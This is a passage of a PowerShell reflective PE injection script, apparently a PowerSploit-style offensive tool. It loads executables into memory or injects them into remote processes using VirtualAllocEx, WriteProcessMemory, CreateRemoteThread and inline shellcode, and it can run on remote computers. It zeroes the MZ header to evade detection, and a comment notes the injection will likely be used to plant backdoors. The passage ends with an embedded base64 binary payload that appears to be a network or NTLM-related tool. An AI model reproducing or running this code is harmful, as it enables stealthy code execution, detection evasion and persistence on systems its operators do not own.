		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
$PEBytes64 = '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